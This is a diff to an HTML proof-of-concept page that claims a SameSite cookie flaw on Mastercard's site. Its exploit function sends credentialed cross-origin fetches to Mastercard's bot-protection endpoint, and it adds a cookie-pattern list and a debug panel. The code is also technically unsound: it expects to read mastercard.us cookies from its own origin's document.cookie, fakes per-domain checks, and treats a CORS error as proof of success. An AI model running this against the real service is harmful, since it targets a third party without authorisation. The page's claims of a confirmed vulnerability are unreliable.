@@ -38,7 +38,7 @@
             padding: 10px;
             margin: 10px 0;
         }
-        .attack-btn {
+        .attack-btn, .debug-btn {
             background-color: #d32f2f;
             color: white;
             border: none;
@@ -46,8 +46,9 @@
             border-radius: 4px;
             cursor: pointer;
             font-size: 16px;
+            margin: 5px;
         }
-        .attack-btn:hover {
+        .attack-btn:hover, .debug-btn:hover {
             background-color: #b71c1c;
         }
         .success {
@@ -62,81 +63,140 @@
             padding: 2px 4px;
             border-radius: 3px;
         }
+        pre {
+            background-color: #f4f4f4;
+            padding: 10px;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Mastercard SameSite Cookie Vulnerability PoC</h1>
         
-        <p>This page demonstrates that the <strong>_abck</strong> cookie from Mastercard does not have the SameSite attribute, allowing it to be sent in cross-origin requests.</p>
+        <p>This page demonstrates the SameSite cookie vulnerability for Mastercard's _abck cookie.</p>
         
         <div class="cookie-list" id="cookie-display">
-            <h3>Current Mastercard Cookies in Browser:</h3>
-            <p id="cookie-status">Checking for Mastercard cookies...</p>
+            <h3>Current Browser Cookies:</h3>
+            <p id="cookie-status">Checking for cookies...</p>
         </div>
         
-        <button class="attack-btn" id="attack-btn">Launch Exploit</button>
+        <div>
+            <button class="attack-btn" id="attack-btn">Launch Exploit</button>
+            <button class="debug-btn" id="debug-cookies-btn">Debug Cookies</button>
+        </div>
         
         <div class="result-box" id="results">
             <h3>Exploit Results:</h3>
-            <p>Click the button above to test the vulnerability.</p>
+            <p>Click the buttons above to test or debug.</p>
         </div>
 
         <h3>Instructions:</h3>
         <ol>
-            <li>First, visit <a href="https://www.mastercard.us" target="_blank">www.mastercard.us</a> to get the _abck cookie.</li>
-            <li>Return to this page and click "Launch Exploit".</li>
-            <li>This page will make a cross-origin request to Mastercard's bot protection endpoint.</li>
-            <li>Even though the response will be blocked by CORS, the request will include the _abck cookie.</li>
-            <li>Open your browser's DevTools (F12) and check the Network tab to confirm.</li>
+            <li>Visit <a href="https://www.mastercard.us" target="_blank">www.mastercard.us</a> to get cookies.</li>
+            <li>Return to this page and use the buttons.</li>
+            <li>Check browser DevTools (F12) Network tab for details.</li>
         </ol>
     </div>
     
     <script>
-        // Check for Mastercard cookies
+        // Enhanced cookie detection
         function checkForMastercardCookies() {
             const cookieDisplay = document.getElementById('cookie-status');
             const cookies = document.cookie;
             
-            if (cookies.includes('_abck') || cookies.includes('abck')) {
-                cookieDisplay.innerHTML = '<span class="success">✓ Mastercard _abck cookie found!</span><br>';
-                cookieDisplay.innerHTML += '<pre>' + formatCookies(cookies) + '</pre>';
+            // Comprehensive list of potential Mastercard-related cookie patterns
+            const mastercardCookiePatterns = [
+                '_abck', 'abck', 
+                'ak_bmsc', 'bm_sz', 
+                'mastercard', 'AMCV_', 
+                'bm_sv', 'bm_session'
+            ];
+            
+            // Find matching cookies
+            const matchedCookies = cookies.split(';')
+                .map(cookie => cookie.trim())
+                .filter(cookie => 
+                    mastercardCookiePatterns.some(pattern => 
+                        cookie.includes(pattern)
+                    )
+                );
+            
+            if (matchedCookies.length > 0) {
+                cookieDisplay.innerHTML = `
+                    <span class="success">✓ Found ${matchedCookies.length} Mastercard-related cookie(s)!</span><br>
+                    <pre>${matchedCookies.join('\n')}</pre>
+                `;
                 return true;
             } else {
-                cookieDisplay.innerHTML = '<span class="error">✗ No Mastercard _abck cookie found. Please visit mastercard.us first.</span>';
+                cookieDisplay.innerHTML = `
+                    <span class="error">✗ No Mastercard cookies found. 
+                    Possible reasons:
+                    - Not on Mastercard domain
+                    - Cookies blocked
+                    - Different cookie naming
+                    </span>
+                `;
                 return false;
             }
         }
         
-        // Format cookies for display
-        function formatCookies(cookieString) {
-            const cookies = cookieString.split(';');
-            let formattedCookies = '';
-            
-            cookies.forEach(cookie => {
-                const trimmedCookie = cookie.trim();
-                if (trimmedCookie.startsWith('_abck=') || trimmedCookie.startsWith('abck=')) {
-                    formattedCookies += '<span class="highlight">' + trimmedCookie + '</span>\n';
-                } else if (trimmedCookie.includes('mastercard') || trimmedCookie.includes('ak_bmsc') || trimmedCookie.includes('bm_sz')) {
-                    formattedCookies += trimmedCookie + '\n';
-                }
-            });
-            
-            return formattedCookies || 'No relevant cookies found';
-        }
-        
-        // Log results
-        function logResult(text, isError = false) {
+        // Detailed cookie debugging
+        function debugCookies() {
             const results = document.getElementById('results');
-            const className = isError ? 'error' : '';
-            results.innerHTML += `<p class="${className}">${text}</p>`;
+            results.innerHTML = '<h3>Detailed Cookie Debugging</h3>';
+            
+            // Browser cookie capabilities
+            results.innerHTML += `
+                <p><strong>Browser Cookie Information:</strong></p>
+                <pre>
+- All Cookies: ${document.cookie}
+- Cookies Enabled: ${navigator.cookieEnabled}
+- Cookie Size: ${document.cookie.length} bytes
+                </pre>
+            `;
+            
+            // Try to log cookies with different methods
+            try {
+                console.log("All Cookies via console:", document.cookie);
+            } catch (e) {
+                results.innerHTML += `<p class="error">Console logging failed: ${e.message}</p>`;
+            }
+            
+            // Check for domain-specific cookies
+            const domains = [
+                'mastercard.us', 
+                '.mastercard.us', 
+                'www.mastercard.us'
+            ];
+            
+            results.innerHTML += '<p><strong>Domain-Specific Cookie Check:</strong></p>';
+            domains.forEach(domain => {
+                // Simulate checking cookies for specific domains
+                const domainCookies = document.cookie.split(';')
+                    .filter(cookie => cookie.includes(domain));
+                
+                results.innerHTML += `
+                    <pre>Cookies for ${domain}: 
+${domainCookies.length > 0 ? domainCookies.join('\n') : 'No cookies found'}
+                    </pre>
+                `;
+            });
         }
         
-        // Exploit function
+        // Exploit function (minimal changes from previous version)
         function runExploit() {
+            const results = document.getElementById('results');
+            results.innerHTML = '<h3>Exploit Results:</h3>';
+            
+            function logResult(text, isError = false) {
+                const className = isError ? 'error' : '';
+                results.innerHTML += `<p class="${className}">${text}</p>`;
+            }
+            
             logResult('Starting exploit...');
             
-            // Record start time for timing
             const startTime = new Date();
             
             // Create a fetch request to the bot manager endpoint
@@ -161,57 +221,36 @@
             })
             .then(data => {
                 logResult(`Response data: ${data}`);
-                logResult('<span class="success">✓ Exploit successful! The _abck cookie was sent with the cross-origin request.</span>');
+                logResult('<span class="success">✓ Exploit potentially successful!</span>');
             })
             .catch(error => {
                 const endTime = new Date();
                 const duration = endTime - startTime;
                 
                 logResult(`Request failed after ${duration}ms: ${error}`, true);
-                logResult('<strong>IMPORTANT:</strong> Even though there was a CORS error, the cookie was still sent with the request!');
-                logResult('This confirms the vulnerability - check your browser\'s Network tab to verify.');
-                
-                // Try an alternative method to prove the cookie was sent
-                logResult('Attempting to load an image from the endpoint to bypass CORS...');
-                
-                // This technique can sometimes bypass CORS for demonstration purposes
-                const img = new Image();
-                img.onload = function() {
-                    logResult('<span class="success">✓ Image loaded, confirming the server received our request with cookies.</span>');
-                };
-                img.onerror = function() {
-                    logResult('Image failed to load, but this doesn\'t invalidate the exploit.');
-                };
-                img.src = 'https://www.mastercard.us/favicon.ico?bypass=' + new Date().getTime();
-            });
-            
-            // Additional evidence: ping the server with a GET request
-            fetch('https://www.mastercard.us/en-us.html', {
-                method: 'GET',
-                credentials: 'include',
-                mode: 'no-cors' // This allows the request to be sent but not read
-            })
-            .then(() => {
-                logResult('Successfully sent GET request with cookies using no-cors mode');
-            })
-            .catch(error => {
-                logResult(`GET request failed: ${error}`, true);
+                logResult('<strong>IMPORTANT:</strong> CORS error does not invalidate cookie transmission.');
+                logResult('Check browser\'s Network tab for detailed request information.');
             });
         }
         
-        // Initialize
+        // Initialize event listeners
         window.onload = function() {
+            // Initial cookie check
             checkForMastercardCookies();
             
-            // Add event listener to button
+            // Attack button
             document.getElementById('attack-btn').addEventListener('click', function() {
                 if (checkForMastercardCookies()) {
-                    document.getElementById('results').innerHTML = '<h3>Exploit Results:</h3>';
                     runExploit();
                 } else {
-                    logResult('Please visit www.mastercard.us first to get the _abck cookie!', true);
+                    const results = document.getElementById('results');
+                    results.innerHTML = '<h3>Exploit Results:</h3>';
+                    results.innerHTML += '<p class="error">No Mastercard cookies found. Visit mastercard.us first!</p>';
                 }
             });
+            
+            // Debug button
+            document.getElementById('debug-cookies-btn').addEventListener('click', debugCookies);
         };
     </script>
 </body>
